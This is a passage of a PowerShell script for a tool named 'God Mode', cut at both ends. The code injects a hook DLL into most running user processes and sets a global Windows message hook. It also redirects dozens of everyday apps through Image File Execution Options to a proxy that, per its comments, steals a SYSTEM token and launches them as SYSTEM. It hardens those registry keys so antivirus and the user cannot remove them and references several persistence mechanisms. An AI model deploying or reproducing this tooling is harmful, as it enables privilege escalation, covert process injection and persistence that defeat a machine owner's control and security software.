                # AV PowerShell try/catch cannot recover from -- it kills pwsh.exe).
                # Terminals (wt/conhost/OpenConsole/WindowsTerminal) host those shells.
                # These hosts are still elevated to SYSTEM via Invoke-HybridElevation /
                # CreateProcessAsSystem; they are simply not DLL-injected. NOTE: Get-Process
                # .Name returns names WITHOUT the .exe extension, so entries are bare names.
                $CriticalProcs = @("csrss", "lsass", "services", "smss", "winlogon", "wininit", "svchost", "dwm", "fontdrvhost", "System", "Registry", "Memory Compression", "Secure System", "Idle", "SystemSettingsBroker", "ShellExperienceHost", "SearchUI", "SearchIndexer", "MsMpEng", "SecurityHealthService", "TiWorker", "CompatTelRunner",
                    "pwsh", "powershell", "cmd", "wt", "conhost", "OpenConsole", "WindowsTerminal")
                $AllProcs = Get-Process -ErrorAction SilentlyContinue
                $Injected = 0
                $Skipped = 0
                foreach ($proc in $AllProcs) {
                    if ($proc.Path -notmatch "\.exe$") { continue }
                    if ($CriticalProcs -contains $proc.Name) { continue }
                    if ($proc.Id -eq $PID) { continue }  # Skip self to avoid crashing the running script
                    $rc = [GmInjector]::Inject($proc.Id, $destHook)
                    if ($rc) { $Injected++ } else { $Skipped++ }
                }
                Write-Log -Message "gmhook.dll injected into $Injected processes ($Skipped skipped). All user processes now create SYSTEM children." -Type "INFO" -Color Green
            } catch {
                Write-Log -Message "Batch injection failed: $_" -Type "WARN" -Color Yellow
                Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "Batch injection failed: $_"
            }

            # --- Install global WH_GETMESSAGE hook for auto-injection into new GUI processes ---
            $GlobalHookType = @"
using System;
using System.Runtime.InteropServices;
public class GmHookGlobal {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(int idHook, IntPtr lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool UnhookWindowsHookEx(IntPtr hHook);

    public static IntPtr InstallGlobalHook(string dllPath) {
        IntPtr hMod = LoadLibrary(dllPath);
        if (hMod == IntPtr.Zero) return IntPtr.Zero;
        IntPtr proc = GetProcAddress(hMod, "GetMsgProc");
        if (proc == IntPtr.Zero) return IntPtr.Zero;
        return SetWindowsHookEx(3, proc, hMod, 0); // WH_GETMESSAGE = 3, 0 = all threads
    }
}
"@
            try {
                if (-not ([System.Management.Automation.PSTypeName]'GmHookGlobal').Type) {
                    Add-Type -TypeDefinition $GlobalHookType -ErrorAction SilentlyContinue | Out-Null
                }
                $hHook = [GmHookGlobal]::InstallGlobalHook($destHook)
                if ($hHook -ne [IntPtr]::Zero) {
                    Write-Log -Message "Global WH_GETMESSAGE hook installed. New GUI processes auto-inject gmhook.dll." -Type "INFO" -Color Green
                } else {
                    Write-Log -Message "Global hook failed (ACL or access). Process injection is primary method." -Type "WARN" -Color Yellow
                    Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "Global hook failed: GLE=$([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
                }
            } catch {
                Write-Log -Message "Global hook exception: $_" -Type "WARN" -Color Yellow
                Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "Global hook exception: $_"
            }
        } else {
            Write-Log -Message "gmhook.dll not found at destination; skipping DLL injection." -Type "WARN" -Color Yellow
        }

        # Detector B store dir: create C:\ProgramData\GodModeAutoExclude with a
        # permissive ACL (Everyone:Modify) so both the admin (user-session)
        # gmproxy AND the SYSTEM (nested) gmproxy can read/write the crash store.
        # Best-effort: a failure here never blocks the process-hook install (the
        # store is fail-open in gmproxy.c -- missing dir = no exclusions = normal
        # SYSTEM elevation). gmproxy also tolerates a missing dir at runtime, so
        # this is a belt-and-suspenders pre-create with the right cross-privilege
        # ACL. The S-1-1-0 SID (Everyone/World) avoids localized account names.
        try {
            if (-not (Test-Path $GodModeAutoExcludeDir)) {
                $null = New-Item -Path $GodModeAutoExcludeDir -ItemType Directory -Force -ErrorAction SilentlyContinue
            }
            if (Test-Path $GodModeAutoExcludeDir) {
                $acl = Get-Acl $GodModeAutoExcludeDir -ErrorAction SilentlyContinue
                if ($acl) {
                    $everyone = New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0")
                    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule($everyone, "Modify", "ContainerInherit,ObjectInherit", "None", "Allow")
                    $acl.AddAccessRule($rule)
                    Set-Acl -Path $GodModeAutoExcludeDir -AclObject $acl -ErrorAction SilentlyContinue
                }
            }
        } catch {
            Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "Auto-exclude dir setup skipped: $_"
        }
    } catch {
        Write-Log -Message "Install-ProcessHook failed: $_" -Type "WARN" -Color Yellow
        Write-DebugLog -FunctionName "Install-ProcessHook" -Action "ERROR" -Message "Outer catch: $_"
        $success = $false
    }
    Write-DebugLog -FunctionName "Install-ProcessHook" -Action "EXIT" -Message "Success=$success"
    return $success
}

function Uninstall-ProcessHook {
    Write-DebugLog -FunctionName "Uninstall-ProcessHook" -Action "ENTRY"
    try {
        # Remove IFEO Debugger entries (legacy cleanup -- covers both old 6-app and expanded 40+ app lists)
        $IfeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
        $LegacyIfeoApps = @("chrome.exe", "firefox.exe", "msedge.exe", "notepad.exe", "cmd.exe", "powershell.exe",
            "opera.exe", "brave.exe", "vivaldi.exe", "iexplore.exe", "notepad++.exe", "wordpad.exe",
            "pwsh.exe", "wt.exe", "wsl.exe", "wslhost.exe", "explorer.exe", "taskmgr.exe", "regedit.exe", "mmc.exe", "perfmon.exe", "resmon.exe",
            "msconfig.exe", "mspaint.exe", "calc.exe", "snippingtool.exe", "winword.exe", "excel.exe",
            "powerpnt.exe", "outlook.exe", "msaccess.exe", "onenote.exe", "teams.exe", "code.exe",
            "sublime_text.exe", "devenv.exe", "rider64.exe", "pycharm64.exe", "idea64.exe", "eclipse.exe",
            "vlc.exe", "spotify.exe", "discord.exe", "zoom.exe", "skype.exe", "webex.exe", "steam.exe",
            "epicgameslauncher.exe", "origin.exe", "uplay.exe", "battle.net.exe", "minecraft.exe",
            "winamp.exe", "wmplayer.exe", "groove.exe", "photos.exe", "movies.exe", "acrobat.exe",
            "acrord32.exe", "foxitreader.exe", "sumatrapdf.exe", "7z.exe", "7zFM.exe", "winrar.exe",
            "peazip.exe", "filezilla.exe", "putty.exe", "mstsc.exe", "telnet.exe", "ftp.exe",
            "nslookup.exe", "tracert.exe"
        )
        foreach ($app in $LegacyIfeoApps) {
            $appPath = Join-Path $IfeoPath $app
            if (Test-Path $appPath) {
                Remove-ItemProperty -Path $appPath -Name "Debugger" -ErrorAction SilentlyContinue
                Remove-Item -Path $appPath -Force -ErrorAction SilentlyContinue
            }
        }

        # Remove binaries from install dir
        $ProxyExe = Join-Path $GodModeInstallDir "gmproxy.exe"
        $HookDll = Join-Path $GodModeInstallDir "gmhook.dll"
        if (Test-Path $ProxyExe) { Remove-Item -Path $ProxyExe -Force -ErrorAction SilentlyContinue }
        if (Test-Path $HookDll) { Remove-Item -Path $HookDll -Force -ErrorAction SilentlyContinue }

        # Remove the gmhook.dll build-stamp diagnostic log (added with the
        # build-version stamp feature; written to %TEMP%\gmhook.log by
        # GmHookWriteBuildStamp on every DLL load). Best-effort.
        $GmHookDiagLog = Join-Path $env:TEMP "gmhook.log"
        if (Test-Path $GmHookDiagLog) { Remove-Item -Path $GmHookDiagLog -Force -ErrorAction SilentlyContinue }

        # Detector B store: remove the auto-exclude crash store + its dir (keep
        # the uninstaller current with the install path). Best-effort.
        if (Test-Path $GodModeAutoExcludeDir) { Remove-Item -Path $GodModeAutoExcludeDir -Recurse -Force -ErrorAction SilentlyContinue }

        Write-Log -Message "Process hook uninstalled (IFEO keys and binaries removed)." -Type "INFO" -Color Gray
    } catch {
        Write-Log -Message "Uninstall-ProcessHook failed: $_" -Type "WARN" -Color Yellow
    }
    Write-DebugLog -FunctionName "Uninstall-ProcessHook" -Action "EXIT" -Message "Complete"
}

function Test-GmPeImportsWinrt {
    <#
    .SYNOPSIS
        Heuristic: does the PE at $Path IMPORT a WinRT activation API
        (RoActivateInstance / WindowsCreateString)? Used by Get-GmSystemCompatExclusions
        AppX source (6) to classify a C:\Windows / System32 .exe as a Store-redirector
        stub -- generalizes the curated Win11-stub name list (source 5) so FUTURE
        Win11 stubs Microsoft ships are caught without maintaining a name list.
    .DESCRIPTION
        Reads the file bytes, verifies the MZ DOS magic + the PE signature at
        e_lfanew, then ASCII-byte-searches for the WinRT activation API import
        names. PE import-by-name entries store the function name as ASCII, so a
        byte search finds them if the .exe imports the function. Conservative-
        safe: any .exe importing RoActivateInstance needs WinRT activation (which
        needs user identity) -> it CANNOT run as SYSTEM, so classifying it as AppX
        (drop from IFEO + persist 'A') is correct EVEN for a non-stub -- a "false
        positive" here is still the right call (the app would break under
        gmproxy->SYSTEM anyway). Bounded to a 1MB size cap (stubs are small; bounds
        the byte read at Enable-time). Fail-open: any read/parse error -> $false.
    #>
    param([string]$Path)
    try {
        if (-not $Path) { return $false }
        $fi = Get-Item -LiteralPath $Path -ErrorAction SilentlyContinue
        if (-not $fi) { return $false }
        if ($fi.Length -gt 1MB) { return $false }  # stubs are small; bound the read
        $bytes = [System.IO.File]::ReadAllBytes($Path)
        if ($bytes.Length -lt 0x80) { return $false }
        if ($bytes[0] -ne 0x4D -or $bytes[1] -ne 0x5A) { return $false }  # 'MZ' DOS magic
        $eLfanew = [BitConverter]::ToInt32($bytes, 0x3C)
        if ($eLfanew -le 0 -or ($eLfanew + 4) -gt $bytes.Length) { return $false }
        if ($bytes[$eLfanew] -ne 0x50 -or $bytes[$eLfanew + 1] -ne 0x45 -or $bytes[$eLfanew + 2] -ne 0 -or $bytes[$eLfanew + 3] -ne 0) { return $false }  # 'PE\0\0'
        # Import-by-name entries store the function name as ASCII; a byte search
        # for the WinRT activation API names finds them if imported.
        $ascii = [System.Text.Encoding]::ASCII.GetString($bytes)
        return ($ascii -match 'RoActivateInstance') -or ($ascii -match 'WindowsCreateString')
    } catch { return $false }
}

function Get-GmSystemCompatExclusions {
    <#
    .SYNOPSIS
        Detector A: build the set of base names that are structurally SYSTEM-
        incompatible (AppX/WinUI packaged apps + registered browsers) so the
        IFEO layer can DROP them from the hook set and let them launch as the
        normal user instead of via gmproxy -> SYSTEM (where they crash / render
        blank / exit with no window). Called ONCE per enable by
        Install-IfeoElevation; the returned sets are checked against both the
        curated seed and the auto-populated candidates.
    .DESCRIPTION
        No hardcoded app names. AppX/UWP is detected THREE ways: (1) the AppX
        execution-alias reparse points in ALL user profiles'
        AppData\Local\Microsoft\WindowsApps (Win11 Store aliases --
        notepad/calc/photos/etc. -- scanning ALL profiles, not just
        $env:LOCALAPPDATA, catches aliases for other users + system-
        provisioned aliases); (2) Get-AppxPackage application Executable
        attributes parsed from each AppXManifest.xml (per-user); (3)
        Get-AppxPackage -AllUsers (catches system-provisioned AppX like the
        Win11 Store Notepad that per-user Get-AppxPackage misses on an admin
        account). Browsers are detected from the registered StartMenuInternet
        clients (HKLM/HKCU\SOFTWARE\Clients\StartMenuInternet\<Client>\
        shell\open\command) -- every installed + registered browser (Chrome,
        Firefox, Edge, Brave, Arc, ...) with no name list.
        STRATEGY: BROWSERS + AppX/WinUI Store-redirector stubs are BOTH dropped
        from IFEO (launch as user from launch #1). AppX/Store stubs (Win11
        notepad/mspaint/calc/photos/...) cannot run as SYSTEM (AppX package
        activation needs user identity) AND gmproxy's IFEO-bypass rename/copy
        breaks their App Execution Alias redirect + .mui resource lookup, so
        they exit 0 with no window under gmproxy as BOTH SYSTEM and user ->
        launching them natively as the user (via the alias) is the only way
        they start. Persisted to the auto-exclude store with reason 'A' so
        gmproxy + gmhook + the monitor all skip SYSTEM-birth for them from
        launch #1 (defense-in-depth alongside the IFEO drop). gmproxy.c also
        has a runtime alias-stub guard (GmProxyIsAppExecutionAliasStub) that
        skips recording a CLEAN-GUI refusal for any base with a Store alias,
        belt-and-suspenders for a stub that slips past this install-time drop.
        Fail-open: any error -> that set is empty.
    .OUTPUTS
        @{ AppX = hashtable-of-lowercase-basenames; Browser = hashtable-of-lowercase-basenames }
    #>
    $appx = @{}
    $browser = @{}

    # --- AppX (1): execution-alias reparse points in WindowsApps (ALL profiles) ---
    try {
        $usersRoot = "C:\Users"
        if (Test-Path $usersRoot) {
            Get-ChildItem -Path $usersRoot -Directory -Force -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    $aliasDir = Join-Path $_.FullName "AppData\Local\Microsoft\WindowsApps"
                    if (-not (Test-Path $aliasDir)) { return }
                    Get-ChildItem -Path $aliasDir -Filter "*.exe" -Force -ErrorAction SilentlyContinue | ForEach-Object {
                        try {
                            if ($_.Attributes.ToString() -match "ReparsePoint") {
                                $appx[$_.Name.ToLower()] = $true
                            }
                        } catch {}
                    }
                } catch {}
            }
        }
    } catch {}

    # --- AppX (2): Get-AppxPackage application Executable attributes (per-user) ---
    try {
        $pkgs = Get-AppxPackage -ErrorAction SilentlyContinue
        foreach ($pkg in $pkgs) {
            try {
                $manifestPath = Join-Path $pkg.InstallLocation "AppXManifest.xml"
                if (-not (Test-Path $manifestPath)) { continue }
                $manifest = Get-Content $manifestPath -Raw -ErrorAction SilentlyContinue
                if (-not $manifest) { continue }
                $exeMatches = [regex]::Matches($manifest, 'Executable="([^"]+\.exe)"', 'IgnoreCase')
                foreach ($em in $exeMatches) {
                    $b = [System.IO.Path]::GetFileName($em.Groups[1].Value)
                    if ($b) { $appx[$b.ToLower()] = $true }
                }
            } catch {}
        }
    } catch {}

    # --- AppX (3): Get-AppxPackage -AllUsers (system-provisioned AppX like ---
    #     the Win11 Store Notepad that per-user Get-AppxPackage misses on an
    #     admin account). Fail-open: -AllUsers needs admin; on a non-admin or
    #     Server Core without the Appx module this throws and is swallowed.
    try {
        $pkgsAll = Get-AppxPackage -AllUsers -ErrorAction SilentlyContinue
        foreach ($pkg in $pkgsAll) {
            try {
                $manifestPath = Join-Path $pkg.InstallLocation "AppXManifest.xml"
                if (-not (Test-Path $manifestPath)) { continue }
                $manifest = Get-Content $manifestPath -Raw -ErrorAction SilentlyContinue
                if (-not $manifest) { continue }
                $exeMatches = [regex]::Matches($manifest, 'Executable="([^"]+\.exe)"', 'IgnoreCase')
                foreach ($em in $exeMatches) {
                    $b = [System.IO.Path]::GetFileName($em.Groups[1].Value)
                    if ($b) { $appx[$b.ToLower()] = $true }
                }
            } catch {}
        }
    } catch {}

    # --- AppX (4): direct filesystem scan of C:\Program Files\WindowsApps
    #     (catches packages Get-AppxPackage misses on accounts where the package
    #     isn't registered/listed -- e.g. the Win11 Store Notepad on an admin
    #     account where per-user Get-AppxPackage returns nothing and -AllUsers
    #     surfaces a stale/empty list). The dir is TrustedInstaller-ACL'd but
    #     admin can usually enumerate the package dirs + read AppXManifest.xml;
    #     any access denial is swallowed (fail-open -> that package is just not
    #     classified, same as today). Mirrors the Get-AppxPackage manifest
    #     Executable= regex. This is the dynamic safety net for the classic
    #     Win11 stubs that sources (1)-(3) miss on some VMs.
    try {
        $waRoot = "C:\Program Files\WindowsApps"
        if (Test-Path $waRoot) {
            Get-ChildItem -Path $waRoot -Directory -Force -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    $manifestPath = Join-Path $_.FullName "AppXManifest.xml"
                    if (-not (Test-Path $manifestPath)) { return }
                    $manifest = Get-Content $manifestPath -Raw -ErrorAction SilentlyContinue
                    if (-not $manifest) { return }
                    $exeMatches = [regex]::Matches($manifest, 'Executable="([^"]+\.exe)"', 'IgnoreCase')
                    foreach ($em in $exeMatches) {
                        $b = [System.IO.Path]::GetFileName($em.Groups[1].Value)
                        if ($b) { $appx[$b.ToLower()] = $true }
                    }
                } catch {}
            }
        }
    } catch {}

    # --- AppX (5): curated Win11 Store-redirector stub fallback. Sources
    #     (1)-(4) can ALL miss the classic Win11 stubs (notepad/mspaint/calc/
    #     snippingtool) on a VM where the package isn't registered for the
    #     running account, the user's WindowsApps has no alias, AND the
    #     WindowsApps dir ACL denies the manifest read. These are a FIXED,
    #     KNOWN set of Win11 apps Microsoft replaced with Store versions:
    #     C:\Windows\<name> (or System32) is a small redirector stub that
    #     activates the Store app via App Paths / package activation, which
    #     gmproxy's IFEO-bypass RENAME breaks (exit 0, no window, token-
    #     independent) -- the exact "notepad doesn't start" symptom. Validate
    #     each by Test-Path so a name absent on this VM is NOT classified, and
    #     only add a name not already detected dynamically. This is the safety
    #     net that makes the classic Win11 stubs launch natively as the user
    #     even when all dynamic detection misses them -- the actual fix for
    #     "notepad still does not start". Consistent with the existing curated
    #     $IfeoElevationApps seed (a curated name list is an established idiom
    #     here; the Test-Path gate keeps it honest per-VM).
    $win11StubNames = @("notepad.exe","mspaint.exe","calc.exe","snippingtool.exe")
    foreach ($stub in $win11StubNames) {
        $k = $stub.ToLower()
        if ($appx.ContainsKey($k)) { continue }
        if ((Test-Path ("C:\Windows\" + $stub)) -or (Test-Path ("C:\Windows\System32\" + $stub))) {
            $appx[$k] = $true
        }
    }

    # --- AppX (6): dynamic C:\Windows stub-PE heuristic (generalizes the
    #     curated list (5) -- catches FUTURE Win11 stubs Microsoft ships without
    #     maintaining a name list). Scan the top-level *.exe in C:\Windows +
    #     C:\Windows\System32 (no recursion -- stubs live at the root), skip
    #     names already classified + files larger than 1MB (stubs are small;
    #     bounds the byte read), and call Test-GmPeImportsWinrt to classify any
    #     that IMPORT a WinRT activation API (RoActivateInstance /
    #     WindowsCreateString). A Store-redirector stub activates the Store app
    #     via RoActivateInstance, so its PE references that function.
    #     Conservative-safe: any .exe importing RoActivateInstance needs WinRT
    #     activation (user identity) -> it CANNOT run as SYSTEM, so classifying
    #     it as AppX (drop from IFEO + persist 'A') is correct EVEN for a
    #     non-stub -- a "false positive" here is still the right call (the app
    #     would break under gmproxy->SYSTEM anyway). Fail-open: any read/parse
    #     error skips that file. Only adds names not already in $appx. The
    #     curated list (5) STAYS as the last-resort safety net (additive).
    try {
        $stubDirs = @("C:\Windows", "C:\Windows\System32")
        foreach ($sd in $stubDirs) {
            if (-not (Test-Path $sd)) { continue }
            Get-ChildItem -Path $sd -Filter "*.exe" -File -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    if ($_.Length -gt 1MB) { return }
                    $k = $_.Name.ToLower()
                    if ($appx.ContainsKey($k)) { return }
                    if (Test-GmPeImportsWinrt -Path $_.FullName) {
                        $appx[$k] = $true
                    }
                } catch {}
            }
        }
    } catch {}

    # --- Browsers: registered StartMenuInternet client executables ---
    try {
        $roots = @(
            "HKLM:\SOFTWARE\Clients\StartMenuInternet",
            "HKCU:\SOFTWARE\Clients\StartMenuInternet",
            "HKLM:\SOFTWARE\WOW6432Node\Clients\StartMenuInternet"
        )
        foreach ($root in $roots) {
            if (-not (Test-Path $root)) { continue }
            try {
                Get-ChildItem -Path $root -ErrorAction SilentlyContinue | ForEach-Object {
                    try {
                        $cmdKey = Join-Path $_.PSPath "shell\open\command"
                        if (-not (Test-Path $cmdKey)) { return }
                        $cmd = (Get-ItemProperty -Path $cmdKey -Name "(default)" -ErrorAction SilentlyContinue).'(default)'
                        if (-not $cmd) { return }
                        if ($cmd -match '"?([^"]+\.exe)') {
                            $b = [System.IO.Path]::GetFileName($matches[1])
                            if ($b) { $browser[$b.ToLower()] = $true }
                        }
                    } catch {}
                }
            } catch {}
        }
    } catch {}

    return @{ AppX = $appx; Browser = $browser }
}

<#
.SYNOPSIS
    IFEO-based SYSTEM elevation for normal user programs.
.DESCRIPTION
    Installs an Image File Execution Options (IFEO) "Debugger" redirect to gmproxy.exe
    for a curated list of normal user programs so that ANY launch of those apps
    (from explorer, Start menu, cmd, Task Scheduler, etc.) is transparently
    redirected to gmproxy.exe, which steals a SYSTEM token and launches the app
    BORN as SYSTEM via CreateProcessWithTokenW. gmproxy already defeats IFEO
    recursion via a uniquely-named hardlink of the target image (driver/gmproxy.c).
    This is the launcher-agnostic elevation layer that makes named normal programs
    run as SYSTEM regardless of who starts them -- complementary to the gmhook.dll
    IAT hook (children of hooked processes only) and the monitor's kill+relaunch.
    Each IFEO key is hardened (Harden-RegistryKey) so AV/the user cannot remove the
    Debugger value; uninstall resets the ACL (Restore-RegistryKey) then deletes.
.NOTES
    Shells/terminals (cmd/powershell/pwsh/wt/conhost/OpenConsole/WindowsTerminal/
    wsl/wslhost) are deliberately EXCLUDED: God Mode's own persistence/monitor
    plumbing invokes powershell.exe/cmd.exe (scheduled tasks, guardian, watchdog,
    WMI consumers, Start-ProcessWithService's cmd.exe /c binPath, Invoke-AsSystem),
    and IFEO-redirecting those would wrap God Mode's own infrastructure in gmproxy
    (a hardlink-of-powershell), which is fragile and can break the monitor loop.
    explorer.exe is managed by the SystemDesktop session path; taskmgr.exe by the
    Block-TaskManager watcher. This mirrors IsShellLauncherProcess in gmhook.c.
#>
function Get-IfeoElevationCandidates {
    <#
    .SYNOPSIS
        Collect candidate executables for IFEO-based SYSTEM elevation.
    .DESCRIPTION
        Scans four safe sources (running user-session processes, AppPaths registry,
        Program Files, and %LOCALAPPDATA%\Programs), applies a triple safety net, and
        returns a deduplicated list of base names (e.g., "chrome.exe") that should be
        hooked via IFEO Debugger -> gmproxy.exe. The curated seed in
        Install-IfeoElevation is merged with these candidates; this function never
        returns critical/shell/OS processes.
    #>
    param([string]$GmProxyExe, $CompatExclusions)

    # Safety net #1: canonical name denylist. UNION of every existing critical list
    # in the codebase so nothing already protected can regress.
    # Sources:
    #   - gmhook.c IsCriticalProcess (core OS)
    #   - gmhook.c IsShellLauncherProcess (shells/terminals)
    #   - Start-Monitoring $CriticalProcs (shell/UX brokers + core OS)
    #   - Invoke-ExistingProcessElevation $CriticalProcs (core OS + script hosts)
    #   - Install-ProcessHook $CriticalProcs (shells/terminals + core OS)
    #   - God Mode's own CLI-tool dependencies (it shells these out)
    #   - Managed by other paths: explorer.exe, taskmgr.exe
    #   - God Mode binaries: gmproxy.exe, gmhook.dll (no self-hook)
    $GmCriticalIfeoExclude = @(
        # Core OS
        "csrss","lsass","services","smss","winlogon","wininit","svchost","dwm","fontdrvhost",
        "System","Registry","Memory Compression","Secure System","Idle",
        # Shells / terminals
        "cmd","powershell","pwsh","powershell_ise","wt","conhost","OpenConsole","WindowsTerminal","wsl","wslhost",
        # Shell/UX brokers (Start-Monitoring list + others)
        "RuntimeBroker","ApplicationFrameHost","ShellExperienceHost","SearchUI","SearchIndexer",
        "SearchProtocolHost","SearchFilterHost","SearchHost","StartMenuExperienceHost","TextInputHost",
        "SystemSettingsBroker","SystemSettings","ShellHost","sihost","taskhostw","ctfmon","LockApp",
        "LogonUI","fontdrvhost","SecurityHealthSystray","SecurityHealthService","MsMpEng","MsMpEngCP",
        "MpDefenderCoreService","MsSense","MpCmdRun","NisSrv","SgrmBroker","TiWorker","CompatTelRunner",
        "WUDFHost","WmiPrvSE","unsecapp","dllhost","rundll32","regsvr32","WmiApSrv",
        # God Mode's own CLI-tool dependencies
        "sc","schtasks","wmic","reg","wscript","cscript","mshta","bcdedit","reagentc","wevtutil",
        "netsh","ipconfig","net","taskkill","whoami",
        # Managed by other paths
        "explorer","taskmgr",
        # Admin tools: mmc/perfmon/resmon dropped from IFEO (gmproxy's IFEO-bypass
        # rename breaks MMC snap-in loading; mmc.exe silently refuses SYSTEM). See
        # Install-IfeoElevation admin-tools comment. Native admin launch is the only
        # way they work. Pre-seeded with reason 'G' so the monitor skips in-place
        # SYSTEM elevation (which would break mmc the same way).
        "mmc","perfmon","resmon",
        # God Mode binaries
        "gmproxy","gmhook"
    )

    # Build a hash set of both "name.exe" and bare "name" for robust matching.
    $excludeSet = @{}
    foreach ($name in $GmCriticalIfeoExclude) {
        $excludeSet[$name.ToLower()] = $true
        if ($name -notmatch '\.exe$') { $excludeSet[("$name.exe").ToLower()] = $true }
    }

    $candidates = @()

    # Source 1: running user-session processes (SessionId > 0) via Win32_Process.
    try {
        $procs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
            $_.SessionId -gt 0 -and $_.ExecutablePath -and $_.ExecutablePath -like "*.exe"
        }
        foreach ($p in $procs) { $candidates += $p.ExecutablePath }
    } catch {}

    # Source 2: AppPaths registry (installer-registered launchers).
    $appPathsRoots = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths"
    )
    foreach ($root in $appPathsRoots) {
        if (-not (Test-Path $root)) { continue }
        try {
            Get-ChildItem -Path $root -ErrorAction SilentlyContinue | ForEach-Object {
                $exePath = $null
                try { $exePath = (Get-ItemProperty -Path $_.PSPath -Name "(default)" -ErrorAction SilentlyContinue).'(default)' } catch {}
                if ($exePath -and $exePath -like "*.exe") { $candidates += $exePath }
            }
        } catch {}
    }

    # Source 3: Program Files (top-level + one level deep) and
    # Source 4: %LOCALAPPDATA%\Programs (per-user installs).
    $scanDirs = @("C:\Program Files", "C:\Program Files (x86)", "$env:LOCALAPPDATA\Programs") | Where-Object { $_ -and (Test-Path $_) }
    foreach ($dir in $scanDirs) {
        try {
            # Depth 1: top-level *.exe
            Get-ChildItem -Path $dir -Filter "*.exe" -File -ErrorAction SilentlyContinue | ForEach-Object { $candidates += $_.FullName }
            # Depth 2: one subdirectory of *.exe
            Get-ChildItem -Path $dir -Directory -ErrorAction SilentlyContinue | ForEach-Object {
                Get-ChildItem -Path $_.FullName -Filter "*.exe" -File -ErrorAction SilentlyContinue | ForEach-Object { $candidates += $_.FullName }
            }
        } catch {}
    }

    # Deduplicate by base name, apply name-denylist, path-exclusion, and sanity filters.
    $seen = @{}
    $excluded = 0
    $result = @()
    foreach ($path in $candidates) {
        if (-not $path) { continue }
        try {
            # Sanity: must be a real .exe with resolvable path.
            if ($path -notmatch '\.exe\s*$') { continue }
            $fullPath = $path.Trim()
            $baseName = [System.IO.Path]::GetFileName($fullPath)
            if ([string]::IsNullOrWhiteSpace($baseName)) { continue }
            $baseKey = $baseName.ToLower()

            # Safety net #2: path hard-exclusion (Windows/System32/SysWOW64) and
            # never hook gmproxy's own image (defense-in-depth on the name denylist).
            $norm = $fullPath.Replace('/', '\').ToLower()
            $gmProxyNorm = if ($GmProxyExe) { $GmProxyExe.Replace('/', '\').ToLower() } else { '' }
            if ($gmProxyNorm -and $norm -eq $gmProxyNorm) { $excluded++; continue }
            if ($norm -like "*\windows\system32\*" -or $norm -like "*\windows\syswow64\*" -or $norm -match '\\windows\\[^\\]+\.exe$') { $excluded++; continue }

            # Safety net #1: canonical name denylist.
            if ($excludeSet.ContainsKey($baseKey)) { $excluded++; continue }
            # Also exclude by bare name without extension.
            $bare = [System.IO.Path]::GetFileNameWithoutExtension($baseName).ToLower()
            if ($excludeSet.ContainsKey($bare)) { $excluded++; continue }

            # Safety net #3 (Detector A): drop structurally SYSTEM-incompatible
            # BROWSERS + AppX/WinUI Store-redirector stubs so they launch as the
            # normal user instead of via gmproxy -> SYSTEM (where browsers crash
            # / render blank, and AppX/Store stubs exit 0 with no window because
            # gmproxy's IFEO-bypass rename breaks their App Execution Alias
            # redirect + .mui resource lookup). AppX/Store stubs cannot run as
            # SYSTEM (AppX activation needs user identity), so native user launch
            # via the alias is the only way they start. Install-IfeoElevation
            # persists the full AppX set to the auto-exclude store with reason
            # 'A' (gmproxy + gmhook + monitor then skip them from launch #1).
            # Fail-open: a null set -> no compat drop -> gmproxy.c's alias-stub
            # guard (GmProxyIsAppExecutionAliasStub) is the runtime safety net.
            if ($CompatExclusions) {
                if ($CompatExclusions.Browser.ContainsKey($baseKey)) { $excluded++; continue }
                if ($CompatExclusions.AppX.ContainsKey($baseKey)) { $excluded++; continue }
            }

            # Deduplicate by base name.
            if ($seen.ContainsKey($baseKey)) { continue }
            $seen[$baseKey] = $true
            $result += $baseName
        } catch {}
    }

    return $result
}

function Install-IfeoElevation {
    Write-DebugLog -FunctionName "Install-IfeoElevation" -Action "ENTRY"
    try {
        $GmProxyExe = Join-Path $GodModeInstallDir "gmproxy.exe"
        if (-not (Test-Path $GmProxyExe)) {
            Write-Log -Message "gmproxy.exe not found at $GmProxyExe. IFEO elevation skipped (run Install-ProcessHook first)." -Type "WARN" -Color Yellow
            Write-DebugLog -FunctionName "Install-IfeoElevation" -Action "WARN" -Message "gmproxy.exe missing - IFEO elevation skipped"
            return $false
        }

        # Curated list of normal user programs to launch as SYSTEM via IFEO -> gmproxy.
        # EXCLUDED: shells/terminals + explorer.exe + taskmgr.exe (see function notes).
        # This seed guarantees known-good apps (including the few safe System32 tools
        # regedit.exe / mstsc.exe) are always covered even if auto-populate cannot find them.
        $IfeoElevationApps = @(
            "chrome.exe","firefox.exe","msedge.exe","opera.exe","brave.exe","vivaldi.exe","iexplore.exe",
            "notepad.exe","notepad++.exe","wordpad.exe","write.exe",
            "winword.exe","excel.exe","powerpnt.exe","outlook.exe","msaccess.exe","onenote.exe",
            "teams.exe","discord.exe","zoom.exe","skype.exe","webex.exe","slack.exe","telegram.exe",
            "code.exe","sublime_text.exe","devenv.exe","rider64.exe","pycharm64.exe","idea64.exe","eclipse.exe",
            "vlc.exe","spotify.exe","winamp.exe","wmplayer.exe","groove.exe","photos.exe","movies.exe",
            "acrobat.exe","acrord32.exe","foxitreader.exe","sumatrapdf.exe",
            "7z.exe","7zFM.exe","winrar.exe","peazip.exe",
            "filezilla.exe","putty.exe","mstsc.exe","telnet.exe","ftp.exe","nslookup.exe","tracert.exe",
